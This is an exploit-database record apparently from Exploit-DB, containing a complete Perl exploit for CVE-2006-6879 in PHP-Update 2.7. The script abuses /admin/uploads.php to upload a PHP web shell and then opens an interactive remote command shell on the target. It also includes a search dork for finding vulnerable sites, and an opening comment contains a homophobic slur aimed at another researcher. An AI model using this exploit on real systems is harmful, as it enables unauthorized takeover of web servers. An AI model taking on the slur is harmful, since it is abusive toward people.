{
  "id": "3020",
  "title": "PHP-Update 2.7 - &#039;/admin/uploads.php&#039; Remote Code Execution",
  "cve": "CVE-2006-6879",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n\r\n# rgod u fucking little piece of shit faggot. way to ruin a private exploit, scumbag\r\n\r\nuse strict;\r\nuse IO::Socket;\r\nuse MIME::Base64;\r\nuse Getopt::Std;\r\n\r\n\r\nmy $app = \"PHP-Update 2.7\";\r\nmy $type = \"Remote Code Execution\";\r\nmy $author = \"undefined1_\";\r\nmy $date = \"2006-10-21\";\r\nmy $settings = \"none\";\r\nmy $dork = \"+\\\"powered by php update\\\"\";\r\n\r\nmy %opt;\r\ngetopts(\"t:\", \\%opt);\r\n$| = 1;\r\nprint \":: $app $type - by $author ::\\n\\n\\n\";\r\n\r\nour $url = $opt{t} || usage();\r\nour $file = randstring(12,16).\".php\";\r\n\r\nif($url =~ m/^(?:http:\\/\\/)(.*)/) {\r\n\t$url = $1;\r\n}\r\nif($url !~ m/^.*\\/$/) {\r\n\t$url .= \"/\";\r\n}\r\n\r\nget_shell($url);\r\n\r\n\r\n\r\nsub get_shell {\r\n\tmy $url = shift;\r\n\t\r\n\tprint \"uploading shell ... \\t\";\r\n\tmy $code = '<?php ini_set(\"max_execution_time\", 0); echo \"++f1++\";';\r\n\t$code .= 'if(isset($_POST[\"c\"])) { $cmd = base64_decode($_POST[\"c\"]); $res = `$cmd`; echo base64_encode($res); } ';\r\n\t$code .= 'if(isset($_POST[\"d\"])) { if (@ini_get(\"safe_mode\") || strtolower(@ini_get(\"safe_mode\")) == \"on\") {echo \"1\";} else {echo \"0\";} ';\r\n\t$code .= '$ds = @ini_get(\"disable_functions\"); if(!empty($ds)) { $ds = str_replace(\" \",\"\",$ds); $ds = explode(\",\",$ds); ';\r\n\t$code .= 'if(in_array(\"system\", $ds)) { echo \"1\"; } else { echo \"0\"; } } else { echo \"0\"; } } ';\r\n\t$code .= 'if(isset($_POST[\"del\"])) { chmod(\"'.$file.'\", 0777); unlink(\"'.$file.'\"); } echo \"++f2++\"; ?>';\r\n\t\r\n\tmy $boundary = \"---------------------------320726961453584717558222351\";\t\r\n\tmy $content  = \"--$boundary\\r\\n\";\r\n\t$content .= \"Content-Disposition: form-data; name=\\\"logincookie[user]\\\"\\r\\n\\r\\n\";\r\n\t$content .= \"\\r\\n\";\r\n\t$content .= \"--$boundary\\r\\n\";\r\n\t$content .= \"Content-Disposition: form-data; name=\\\"filecat\\\"\\r\\n\\r\\n\";\r\n\t$content .= \"gfx\\r\\n\";\r\n\t$content .= \"--$boundary\\r\\n\";\r\n\t$content .= \"Content-Disposition: form-data; name=\\\"rights[7]\\\"\\r\\n\\r\\n\";\r\n\t$content .= \"1\\r\\n\";\r\n\t$content .= \"--$boundary\\r\\n\";\r\n\t$content .= \"Content-Disposition: form-data; name=\\\"action\\\"\\r\\n\\r\\n\";\r\n\t$content .= \"login\\r\\n\";\r\n\t$content .= \"--$boundary\\r\\n\";\r\n\t$content .= \"Content-Disposition: form-data; name=\\\"userfile\\\"; filename=\\\"$file\\\"\\r\\n\";\r\n\t$content .= \"Content-Type: text/plain\\r\\n\\r\\n\".$code.\"\\r\\n\";\r\n\t$content .= \"--$boundary--\\r\\n\";\r\n\tmy $data = \"POST \" . parse_page($url . \"admin/uploads.php\") . \" HTTP/1.1\\r\\n\";\r\n\t$data .= \"Host: \" . parse_host($url) . \"\\r\\n\";\r\n\t$data .= \"Connection: close\\r\\n\";\r\n\t$data .= \"Content-Type: multipart/form-data; boundary=$boundary\\r\\n\";\r\n\t$data .= \"Content-Length: \" . length($content) . \"\\r\\n\\r\\n\";\r\n\tmy $recv = sendpacket(parse_host($url), parse_port($url), $data.$content);\r\n\r\n\t$content = \"d=1\";\r\n\t$data = \"POST \" . parse_page($url . \"gfx/$file\") . \" HTTP/1.1\\r\\n\";\r\n\t$data .= \"Host: \" . parse_host($url) . \"\\r\\n\";\r\n\t$data .= \"Connection: close\\r\\n\";\r\n\t$data .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t$data .= \"Content-Length: \" . length($content) . \"\\r\\n\\r\\n\";\r\n\t$recv = sendpacket(parse_host($url), parse_port($url), $data.$content);\r\n\t\t\r\n\tif($recv !~ m/200 OK/m) {\r\n\t\tprint \"failed\\n\";\r\n\t\treturn;\r\n\t}\t\t\r\n\t\t\r\n\tmy $index1 = index($recv, \"++f1++\") + 6;\r\n\tmy $index2 = index($recv, \"++f2++\", $index1);\r\n\tif($index1 < 0 || $index2 < 0) {\r\n\t\tprint \"failed\\n\";\r\n\t\treturn;\r\n\t}\r\n\tprint \"OK\\n\";\r\n\tprint \"shell @ gfx/$file\\n\";\r\n\t\r\n\t$recv = substr($recv, $index1, $index2-$index1);\r\n\tmy $clean = 0;\r\n\r\n\tif(substr($recv,0,1) == \"1\") {\r\n\t\tprint \"safe mod on, exiting\\n\";\r\n\t\tclean();\r\n\t}\r\n\telse {\r\n\t\tprint \"safe mod off\\n\";\r\n\t}\r\n\tif(substr($recv,1,1) == \"1\") {\r\n\t\tprint \"system() disabled, exiting\\n\";\r\n\t\tclean();\r\n\t}\r\n\telse {\r\n\t\tprint \"system() enabled\\n\";\r\n\t}\r\n\r\n\t$SIG{INT} = \\&clean;\r\n\t$SIG{KILL} = \\&clean;\r\n\t$SIG{QUIT} = \\&clean;\r\n\t$SIG{SEGV} = \\&clean;\r\n\twhile(1) \r\n\t{\r\n\t\tprint \"shell\\$ \";\r\n\t\tmy $command;\r\n\t\twhile(<STDIN>) \r\n\t\t{\r\n\t\t\t$command=$_;\r\n\t\t\tchomp($command);\r\n\t\t\tlast;\r\n\t\t}\r\n\t\tif($command eq \"exit\")\r\n\t\t{\r\n\t\t\tclean();\r\n\t\t}\r\n\r\n\t\t$content = \"c=\".encode_base64($command);\r\n\t\t$data = \"POST \" . parse_page($url . \"gfx/$file\") . \" HTTP/1.1\\r\\n\";\r\n\t\t$data .= \"Host: \" . parse_host($url) . \"\\r\\n\";\r\n\t\t$data .= \"Connection: close\\r\\n\";\r\n\t\t$data .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t\t$data .= \"Content-Length: \" . length($content) . \"\\r\\n\\r\\n\";\r\n\t\t$recv = sendpacket(parse_host($url), parse_port($url), $data . $content);\r\n\t\t\r\n\t\t$index1 = index($recv, \"++f1++\") + 6;\r\n\t\t$index2 = index($recv, \"++f2++\", $index1);\r\n\t\tif($index1 >= 0 || $index2 >= 0) {\r\n\t\t\tmy $resp = decode_base64(substr($recv, $index1, $index2-$index1));\r\n\t\t\tchomp($resp);\r\n\t\t\tprint \"$resp\\n\";\r\n\t\t}\t\t\r\n\t}\t\r\n}\r\n\r\nsub clean {\r\n\tmy $content = \"del=1\";\r\n\tmy $data = \"POST \" . parse_page($url . \"gfx/$file\") . \" HTTP/1.1\\r\\n\";\r\n\t$data .= \"Host: \" . parse_host($url) . \"\\r\\n\";\r\n\t$data .= \"Connection: close\\r\\n\";\r\n\t$data .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n\t$data .= \"Content-Length: \" . length($content) . \"\\r\\n\\r\\n\";\r\n\tsendpacket(parse_host($url), parse_port($url), $data.$content);\r\n\texit;\r\n}\r\n\r\n\r\n# ======================================================\r\n\r\nsub parse_host {\r\n\tmy $url = shift;\r\n\tif($url =~ m/^([^\\/:]+).*\\//) {\r\n\t\treturn $1;\r\n\t}\r\n\treturn \"127.0.0.1\";\r\n}\r\n\r\nsub parse_port {\r\n\tmy $url = shift;\r\n\tif($url =~ m/^(?:[^\\/:]+):(\\d+)\\//) {\r\n\t\treturn $1;\r\n\t}\r\n\treturn \"80\";\r\n}\r\n\r\nsub parse_page {\r\n\tmy $url = shift;\r\n\tif($url =~ m/^(?:[^\\/]+)(\\/.*)/) {\r\n\t\treturn $1;\r\n\t}\r\n\treturn \"/\";\r\n}\r\n\r\nsub randstring(\\$,\\$) {\r\n\tmy $min = shift;\r\n\tmy $max = shift;\r\n\r\n\tmy $length = int( (rand(65535)%($max-$min+1))+$min);\r\n\tmy $ret = \"\";\r\n\tfor(my $i = 0; $i < $length; $i++)\r\n\t{\r\n\t\tmy $w = int(rand(3));\r\n\t\tif($w == 0)\r\n\t\t{\r\n\t\t\t$ret .= chr(97 + int(rand(26)));\r\n\t\t}\r\n\t\telsif($w == 1)\r\n\t\t{\r\n\t\t\t$ret .= chr(65 + int(rand(26)));\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t$ret .= chr(48 + int(rand(10)));\r\n\t\t}\r\n\t}\r\n\treturn $ret;\r\n}\r\n\r\nsub sendpacket {\r\n\tmy $server = shift;\r\n\tmy $port = shift;\r\n\tmy $data = shift;\r\n\r\n\tmy $sock = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => $server, PeerPort => $port) or die \":: Could not connect to $server:80 $!\\n\";\r\n\tprint $sock \"$data\";\r\n\t\r\n\t$data = \"\";\r\n\tmy $resp;\r\n\twhile($resp = <$sock>)\t{ $data .= $resp; }\r\n\t\r\n\tclose($sock);\r\n\treturn $data;\r\n}\r\n\r\nsub usage() {\r\n\tprintf \"usage: %s -t<url>\\n\", $0;\r\n\texit;\r\n}\r\n\r\n# milw0rm.com [2006-12-26]",
  "url": "https://www.exploit-db.com/exploits/3020"
}